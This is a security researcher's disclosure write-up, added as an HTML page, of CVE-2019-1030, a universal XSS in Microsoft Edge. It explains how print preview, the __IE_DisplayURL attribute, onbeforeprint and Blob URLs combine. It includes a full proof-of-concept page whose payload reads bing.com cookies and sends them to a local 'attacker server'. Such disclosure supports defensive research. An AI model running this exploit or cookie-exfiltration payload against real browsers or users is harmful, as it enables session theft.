@@ -1,0 +1,260 @@
+<!doctype html>
+<html>
+<head>
+	<title>(CVE-2019-1030) Microsoft Edge - Universal XSS</title>
+	<link href="../q.css?q2" rel="stylesheet">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="https://leucosite.com/Microsoft-Edge-uXSS/" />
+<meta name="twitter:title" content="Microsoft Edge uXSS" />
+<meta name="twitter:creator" content="@qab">
+<meta name="twitter:description" content="Injecting Javascript into an unexpected context results in weird behavior leading to universal XSS." />
+<meta name="twitter:image" content="https://leucosite.com/qimg/Art20.png" />
+<style>.qResize{
+	width:80%;
+	height:80%;
+}
+#qWriteup p{white-space: pre-wrap;}
+	code{background-color:#cccccc;}
+	#qpic{width:500px;}
+</style>
+</head>
+<body>
+<div id="qLogo"><img src="../q.png"/> 
+<div id="qNav">
+<a href="../">Home</a>
+<a href="../About">About</a>
+<a href="../Tools">Tools</a>
+<a href="../Links">Links</a>
+<a href="https://www.twitter.com/qab" target="_BLANK">Twitter</a>
+<a href="../Stuff">Stuff</a>
+
+
+</div>
+</div>
+<div id="qWriteup">
+<h1>Microsoft Edge - Universal XSS</h1>
+<br>
+
+<p>     The universal XSS (uXSS) is a coveted bug in browsers, it gives you the ability to execute Javascript as any website.
+ It's like having an XSS in all websites which is pretty interesting. What's more interesting is the way I found this bug - You see, usually when I imagine uXSS bugs it's something to do with the IFRAME element or messing around with the URL. But I never imagined I would find a uXSS bug using the <code>'print()'</code> function.
+ 
+</p>
+ 
+<h2>The Print Preview Context</h2>
+ 
+<p>Let's talk about what actually happens when Edge displays a print preview window. 
+I always assumed it was just a screenshot drawn into a <a href="https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API" target="_blank" rel="noopener noreferer">Canvas type technology</a>, but in fact the page you are printing is copied into a temporary location and re-rendered! 
+<br>When we execute <code>'print()'</code> in a page, we see the following file system activity in <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon" target="_blank" rel="noopener noreferer">Process Monitor</a>:
+ 
+<a href="./procmon.png" target="_blank"><img style="width: 80%;" src="./procmon.png" /></a>
+ 
+So, a file is being created in Edge temporary directory and the content of this file is a slightly modified version of the original page we were trying to print. Let's compare.
+
+Before print:
+<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #008080">&lt;!doctype html&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;html&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;head&gt;</span>
+	<span style="color: #000080; font-weight: bold">&lt;title&gt;</span>Printer Button<span style="color: #000080; font-weight: bold">&lt;/title&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;/head&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;body&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;button</span> <span style="color: #FF0000">id=</span><span style="color: #0000FF">&quot;qbutt&quot;</span><span style="color: #000080; font-weight: bold">&gt;</span>Print!<span style="color: #000080; font-weight: bold">&lt;/button&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;iframe</span> <span style="color: #FF0000">src=</span><span style="color: #0000FF">&quot;https://www.bing.com/?q=example&quot;</span><span style="color: #000080; font-weight: bold">&gt;&lt;/iframe&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;script&gt;</span>
+qbutt.onclick=e=&gt;{
+	window.print();
+}
+<span style="color: #000080; font-weight: bold">&lt;/script&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;/body&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;/html&gt;</span>
+</pre></div>
+<br>
+
+
+After print:<br>
+<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #008080">&lt;!DOCTYPE HTML&gt;</span>
+<span style="color: #008080">&lt;!DOCTYPE html PUBLIC &quot;&quot; &quot;&quot;&gt;</span><span style="color: #000080; font-weight: bold">&lt;HTML</span> <span style="color: #FF0000">__IE_DisplayURL=</span><span style="color: #0000FF">&quot;http://q.leucosite.com:777/printExample.html&quot;</span><span style="color: #000080; font-weight: bold">&gt;&lt;HEAD&gt;&lt;META</span> 
+<span style="color: #FF0000">content=</span><span style="color: #0000FF">&quot;text/html; charset=utf-8&quot;</span> <span style="color: #FF0000">http-equiv=</span><span style="color: #0000FF">Content-Type</span><span style="color: #000080; font-weight: bold">&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;BASE</span> <span style="color: #FF0000">HREF=</span><span style="color: #0000FF">&quot;http://q.leucosite.com:777/printExample.html&quot;</span><span style="color: #000080; font-weight: bold">&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;STYLE&gt;</span> <span style="color: #000080; font-weight: bold">HTML</span> { <span style="color: #000080; font-weight: bold">font-family</span> : <span style="color: #0000FF">&quot;Times New Roman&quot;</span> } <span style="color: #000080; font-weight: bold">&lt;/STYLE&gt;&lt;TITLE&gt;</span>Printer 
+Button<span style="color: #000080; font-weight: bold">&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;BUTTON</span> <span style="color: #FF0000">id=</span><span style="color: #0000FF">&quot;qbutt&quot;</span><span style="color: #000080; font-weight: bold">&gt;</span>Print!<span style="color: #000080; font-weight: bold">&lt;/BUTTON&gt;</span> <span style="color: #000080; font-weight: bold">&lt;IFRAME</span> <span style="color: #FF0000">src=</span><span style="color: #0000FF">&quot;file://C:\Users\Q\AppData\Local\Packages\microsoft.microsoftedge_8wekyb3d8bbwe\AC\#!001\Temp\3P9TBP2L.htm&quot;</span><span style="color: #000080; font-weight: bold">&gt;&lt;/IFRAME&gt;</span> 
+<span style="color: #000080; font-weight: bold">&lt;SCRIPT&gt;</span>
+qbutt.onclick=e=&amp;gt;{
+	window.print();
+}
+<span style="color: #000080; font-weight: bold">&lt;/SCRIPT&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;/BODY&gt;&lt;/HTML&gt;</span>
+</pre></div><br>
+
+There are a few things we can notice from this comparison.
+<br>
+<ol>
+  <li>Javascript is encoded and rendered invalid.</li>
+  <li>The IFRAME now points to another local file in the same directory which contains the source code of the original bing.com reference.<br></li>
+  <li>The HTML element now has a peculiar attribute <code>'__IE_DisplayURL'</code></li>
+</ol> 
+
+
+I did a few tests in regards to [1] and [2], first I tried to see if I can still get valid Javascript after the encoding in hopes I would get Javascript execution.
+But it turns out that any Javascript coming from within a <code>'&lt;script&gt;'</code> element, despite being valid or invalid, is not executed. <br><br>
+With [2] I was able to come up with a OS username disclosure using CSS <code>'@media print{}'</code> functionality plus <a href="https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d" target="_blank" rel="noopener noreferer">CSS selector magic</a> to grab the OS username from the resulting IFRAME href value. However, this was not good enough.  <br>
+<br>
+[3] Was where things got interesting, this attribute is very unusual and up until this point I have never seen it. So instantly I looked it up and came with a few articles, looked like <a href="https://masatokinugawa.l0.cm/2017/05/" target="_blank" rel="noopener noreferer">Masato Kinugawa has already played with this attribute</a> and found pretty cool bugs.
+<br><br>
+After doing some reading and messing around, I found that the print preview context relies on this attribute to know where the document came from. This makes sense since essentially Edge is opening files within the <code>'file:'</code> URI scheme. However, with this attribute hinting to the origin, you will notice all requests coming from this document (within print preview) will mimic the exact same behavior as if it's coming from the original website.
+<br><br>
+But how can we abuse this attribute? There must be a way!
+</p>
+<h2>Executing Javascript within Print Preview</h2><p>Like I said before, any Javascript coming from within a normal SCRIPT tag will be blocked or just ignored. But what about other vectors? So I tried everything under the sun that I could think of and I will spare you all the failed attempts and get straight to the point.
+<br>We are dealing with a print function here, so naturally I played with the print related events, the one that got me a result was <code>'onbeforeprint'</code>, using it got me the ability to inject an IFRAME that points to any website without having Edge convert it into a file first. So almost immediately I tried injecting an IFRAME which was pointing to a Javascript URL and boom! That particular Javascript was executed in the print preview context.
+
+The Javascript injection test:
+<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #008080">&lt;!doctype html&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;html&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;head&gt;</span>
+	<span style="color: #000080; font-weight: bold">&lt;title&gt;</span>Printer Button<span style="color: #000080; font-weight: bold">&lt;/title&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;/head&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;body&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;button</span> <span style="color: #FF0000">id=</span><span style="color: #0000FF">&quot;qbutt&quot;</span><span style="color: #000080; font-weight: bold">&gt;</span>Print!<span style="color: #000080; font-weight: bold">&lt;/button&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;div</span> <span style="color: #FF0000">id=</span><span style="color: #0000FF">&quot;qcontent&quot;</span><span style="color: #000080; font-weight: bold">&gt;&lt;/div&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;script&gt;</span>
+qbutt.onclick=e=&gt;{
+	window.print();
+}
+
+window.onbeforeprint=<span style="color: #000080; font-weight: bold">function</span>(e){
+	qcontent.innerHTML=<span style="color: #a61717; background-color: #e3d2d2">`</span>&lt;iframe src=<span style="color: #0000FF">&quot;javascript:if(top.location.protocol==&#39;file:&#39;){document.write(&#39;in print preview&#39;)}&quot;</span>&gt;&lt;<span style="color: #a61717; background-color: #e3d2d2">/iframe&gt;`;</span>
+	
+	}
+<span style="color: #000080; font-weight: bold">&lt;/script&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;/body&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;/html&gt;</span>
+</pre></div>
+<br>
+After print preview conversion:
+<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #008080">&lt;!DOCTYPE HTML&gt;</span>
+<span style="color: #008080">&lt;!DOCTYPE html PUBLIC &quot;&quot; &quot;&quot;&gt;</span><span style="color: #000080; font-weight: bold">&lt;HTML</span> <span style="color: #FF0000">__IE_DisplayURL=</span><span style="color: #0000FF">&quot;http://q.leucosite.com/dl.html&quot;</span><span style="color: #000080; font-weight: bold">&gt;&lt;HEAD&gt;&lt;META</span> 
+<span style="color: #FF0000">content=</span><span style="color: #0000FF">&quot;text/html; charset=windows-1252&quot;</span> <span style="color: #FF0000">http-equiv=</span><span style="color: #0000FF">Content-Type</span><span style="color: #000080; font-weight: bold">&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;BASE</span> <span style="color: #FF0000">HREF=</span><span style="color: #0000FF">&quot;http://q.leucosite.com/dl.html&quot;</span><span style="color: #000080; font-weight: bold">&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;STYLE&gt;</span> <span style="color: #000080; font-weight: bold">HTML</span> { <span style="color: #000080; font-weight: bold">font-family</span> : <span style="color: #0000FF">&quot;Times New Roman&quot;</span> } <span style="color: #000080; font-weight: bold">&lt;/STYLE&gt;&lt;TITLE&gt;</span>Printer 
+Button<span style="color: #000080; font-weight: bold">&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;BUTTON</span> <span style="color: #FF0000">id=</span><span style="color: #0000FF">&quot;qbutt&quot;</span><span style="color: #000080; font-weight: bold">&gt;</span>Print!<span style="color: #000080; font-weight: bold">&lt;/BUTTON&gt;</span> <span style="color: #000080; font-weight: bold">&lt;DIV</span> 
+<span style="color: #FF0000">id=</span><span style="color: #0000FF">&quot;qcontent&quot;</span><span style="color: #000080; font-weight: bold">&gt;&lt;IFRAME</span> <span style="color: #FF0000">src=</span><span style="color: #0000FF">&quot;javascript:if(top.location.protocol==&#39;file:&#39;){document.write(&#39;in print preview&#39;)}&quot;</span><span style="color: #000080; font-weight: bold">&gt;&lt;/IFRAME&gt;&lt;/DIV&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;SCRIPT&gt;</span>
+qbutt.onclick=e=&amp;gt;{
+	window.print();
+}
+
+window.onbeforeprint=<span style="color: #000080; font-weight: bold">function</span>(e){
+	qcontent.innerHTML=<span style="color: #a61717; background-color: #e3d2d2">`</span>&amp;lt;iframe src=<span style="color: #0000FF">&quot;javascript:if(top.location.protocol==&#39;file:&#39;){document.write(&#39;in print preview&#39;)}&quot;</span>&amp;gt;&amp;lt;<span style="color: #a61717; background-color: #e3d2d2">/iframe&amp;gt;`;</span>
+	
+	}
+<span style="color: #000080; font-weight: bold">&lt;/SCRIPT&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;/BODY&gt;&lt;/HTML&gt;</span>
+</pre></div>
+
+<br>
+Result screenshot:<br>
+<a href="./injection.png" target="_blank"><img  style="width: 80%;" src="./injection.png" /></a><br>
+Now, just by having Javascript execution does not mean we are done. As I mentioned before, because of the <code>'__IE_DisplayURL'</code> attribute then any request or API will be treated as if coming from the original document origin.
+
+
+</p>
+<h2>The Actual uXSS</h2><p>Now that we have the Javascript execution, we need to somehow construct our own 'print preview document' with our own custom <code>'__IE_DisplayURL'</code> and then we can mimic any website we choose resulting in uXSS.
+<br>I found that using a <a href="https://developer.mozilla.org/en-US/docs/Web/API/URL/createObjectURL" target="_blank" rel="noopener noreferer">Blob URL</a> I was able to achieve exactly that! So I made my own print document with the custom attribute pointing to my target website ('bing.com' in this case) and it contained a Javascript IFRAME which will execute as if it's from 'bing.com' itself.
+<br>
+I injected the following Javascript:
+<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #000080; font-weight: bold">if</span> (top.location.protocol == <span style="color: #0000FF">&#39;file:&#39;</span>) {
+    setTimeout(<span style="color: #000080; font-weight: bold">function</span>() {
+        top.location = URL.createObjectURL(<span style="color: #000080; font-weight: bold">new</span> Blob([top.document.getElementById(<span style="color: #0000FF">&#39;qd&#39;</span>).value], {
+            type: <span style="color: #0000FF">&#39;text/html&#39;</span>
+        }))
+    }, <span style="color: #0000FF">1000</span>)
+}
+</pre></div>
+<br>
+Where 'top.document.getElementById('qd').value' is the following fake 'print document':
+<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #008080">&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.0 Transitional//EN&quot;&gt;</span><span style="color: #000080; font-weight: bold">&lt;HTML</span> 
+<span style="color: #FF0000">__IE_DisplayURL=</span><span style="color: #0000FF">&quot;https://www.bing.com/&quot;</span><span style="color: #000080; font-weight: bold">&gt;&lt;HEAD&gt;&lt;META</span> <span style="color: #FF0000">content=</span><span style="color: #0000FF">&quot;text/html; </span>
+<span style="color: #0000FF">charset=windows-1252&quot;</span> <span style="color: #FF0000">http-equiv=</span><span style="color: #0000FF">Content-Type</span><span style="color: #000080; font-weight: bold">&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;BASE</span> <span style="color: #FF0000">HREF=</span><span style="color: #0000FF">&quot;https://www.bing.com/&quot;</span><span style="color: #000080; font-weight: bold">&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;STYLE&gt;</span> <span style="color: #000080; font-weight: bold">HTML</span> { <span style="color: #000080; font-weight: bold">font-family</span> : <span style="color: #0000FF">&quot;Times New Roman&quot;</span> } <span style="color: #000080; font-weight: bold">&lt;/STYLE&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;STYLE&gt;iframe</span> {
+	<span style="color: #000080; font-weight: bold">width</span>: <span style="color: #0000FF">300px</span>; <span style="color: #000080; font-weight: bold">height</span>: <span style="color: #0000FF">300px</span>;
+}
+<span style="color: #000080; font-weight: bold">&lt;/STYLE&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;/HEAD&gt;&lt;BODY&gt;</span>
+
+<span style="color: #000080; font-weight: bold">&lt;iframe</span> <span style="color: #FF0000">id=</span><span style="color: #0000FF">&quot;qif&quot;</span> <span style="color: #FF0000">src=</span><span style="color: #0000FF">&quot;javascript:qa=top.document.createElement(&#39;img&#39;);qa.src=&#39;http://localhost:8080/?&#39;+escape(btoa(top.document.cookie));top.document.body.appendChild(qa);&#39;just sent the following data to attacker server:&lt;br&gt;&#39;+top.document.cookie&quot;</span><span style="color: #000080; font-weight: bold">&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;/BODY&gt;&lt;/HTML&gt;</span>
+</pre></div>
+<br>All I'm doing is reading 'document.cookie' and sending it to a server. 
+<br><br> To summarize what the final exploit is doing:
+
+<ol>
+  <li>Using the <code>'onbeforeprint'</code> event, I insert an IFRAME that points to my Javascript payload right before printing.</li>
+  <li>I call <code>window.print()</code> to initiate.</li>
+  <li>Edge then displays the print preview window whilst rendering my injected Javascript</li>
+  <li>The injected Javascript created a Blob URL that contains my custom 'bing.com' print document and redirects the top frame to this URL.</li>
+  <li>The print preview context gets fooled into thinking the content of my Blob URL is a legitimate print document and sets the documents origin to 'bing.com' through the <code>'__IE_DisplayURL'</code> attribute.</li>
+  <li>The fake print document contains yet another Javascript IFRAME which simply displays the <code>'document.cookie'</code> of 'bing.com'</li>
+  <li>uXSS achieved!</li>
+</ol> 
+
+</p>
+<h2>Final PoC and Video</h2><p>
+<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #008080">&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.0 Transitional//EN&quot;&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;HTML&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;head&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;style&gt;iframe</span>{<span style="color: #000080; font-weight: bold">width</span>:<span style="color: #0000FF">300px</span>;<span style="color: #000080; font-weight: bold">height</span>:<span style="color: #0000FF">300px</span>;}<span style="color: #000080; font-weight: bold">&lt;/style&gt;</span>
+
+<span style="color: #000080; font-weight: bold">&lt;/head&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;body&gt;</span>
+<span style="color: #008800; font-style: italic">&lt;!-- -----------------------------HTML for our blob------------------------------------ --&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;textarea</span> <span style="color: #FF0000">id=</span><span style="color: #0000FF">&quot;qd&quot;</span><span style="color: #000080; font-weight: bold">&gt;</span>
+<span style="color: #008080">&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.0 Transitional//EN&quot;&gt;</span><span style="color: #000080; font-weight: bold">&lt;HTML</span> 
+<span style="color: #FF0000">__IE_DisplayURL=</span><span style="color: #0000FF">&quot;https://www.bing.com/&quot;</span><span style="color: #000080; font-weight: bold">&gt;&lt;HEAD&gt;&lt;META</span> <span style="color: #FF0000">content=</span><span style="color: #0000FF">&quot;text/html; </span>
+<span style="color: #0000FF">charset=windows-1252&quot;</span> <span style="color: #FF0000">http-equiv=</span><span style="color: #0000FF">Content-Type</span><span style="color: #000080; font-weight: bold">&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;BASE</span> <span style="color: #FF0000">HREF=</span><span style="color: #0000FF">&quot;https://www.bing.com/&quot;</span><span style="color: #000080; font-weight: bold">&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;STYLE&gt;</span> <span style="color: #000080; font-weight: bold">HTML</span> { <span style="color: #000080; font-weight: bold">font-family</span> : <span style="color: #0000FF">&quot;Times New Roman&quot;</span> } <span style="color: #000080; font-weight: bold">&lt;/STYLE&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;STYLE&gt;iframe</span> {
+	<span style="color: #000080; font-weight: bold">width</span>: <span style="color: #0000FF">300px</span>; <span style="color: #000080; font-weight: bold">height</span>: <span style="color: #0000FF">300px</span>;
+}
+<span style="color: #000080; font-weight: bold">&lt;/STYLE&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;/HEAD&gt;&lt;BODY&gt;</span>
+
+<span style="color: #000080; font-weight: bold">&lt;iframe</span> <span style="color: #FF0000">id=</span><span style="color: #0000FF">&quot;qif&quot;</span> <span style="color: #FF0000">src=</span><span style="color: #0000FF">&quot;javascript:qa=top.document.createElement(&#39;img&#39;);qa.src=&#39;http://localhost:8080/?&#39;+escape(btoa(top.document.cookie));top.document.body.appendChild(qa);&#39;just sent the following data to attacker server:&lt;br&gt;&#39;+top.document.cookie&quot;</span><span style="color: #000080; font-weight: bold">&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;/BODY&gt;&lt;/HTML&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;/textarea&gt;</span>
+<span style="color: #008800; font-style: italic">&lt;!-- ---------------------------------------------------------------------------- --&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;script&gt;</span>
+
+
+<span style="color: #000080; font-weight: bold">var</span> qdiv=document.createElement(<span style="color: #0000FF">&#39;div&#39;</span>);
+document.body.appendChild(qdiv);
+window.onbeforeprint=<span style="color: #000080; font-weight: bold">function</span>(e){
+	qdiv.innerHTML=<span style="color: #a61717; background-color: #e3d2d2">`</span>&lt;iframe src=<span style="color: #0000FF">&quot;javascript:if(top.location.protocol==&#39;file:&#39;){setTimeout(function(){top.location=URL.createObjectURL(new Blob([top.document.getElementById(&#39;qd&#39;).value],{type:&#39;text/html&#39;}))},1000)}&quot;</span>&gt;&lt;<span style="color: #a61717; background-color: #e3d2d2">/iframe&gt;`;</span>
+	
+	}
+
+window.print();
+<span style="color: #000080; font-weight: bold">&lt;/script&gt;</span>
+
+<span style="color: #000080; font-weight: bold">&lt;style&gt;</span>
+
+
+<span style="color: #000080; font-weight: bold">&lt;/style&gt;</span>
+
+
+<span style="color: #000080; font-weight: bold">&lt;/body&gt;</span>
+
+<span style="color: #000080; font-weight: bold">&lt;/html&gt;</span>
+</pre></div>
+<br>
+<video loop="" controls="" style="width:80%;"><source type="video/mp4" src="https://i.imgur.com/TYAQHp3.mp4"></video>
+
+</p>
+<h3>References</h3>
+<a href="https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2019-1030" target="_blank" rel="noopener noreferer">https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2019-1030</a>
+
+</div><Br><br>
+</body>
+</html> 
